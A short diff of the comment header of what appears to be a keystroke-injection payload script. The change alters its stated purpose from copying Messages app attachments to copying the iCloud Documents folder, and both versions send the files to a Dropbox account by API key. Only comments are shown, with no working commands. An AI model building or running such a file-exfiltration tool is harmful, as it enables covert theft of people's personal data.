@@ -1,4 +1,4 @@
-REM This Script will copy all the attachments in the messages app and send them to your dropbox API
+REM This Script will copy the Documents folder in Icloud and send them to your dropbox API
 REM Replace '<SYSTEM USERNAME HERE>' with the systems actual username 
 REM Replace '<YOUR API KEY HERE>' with your actual Dropbox API key 
 
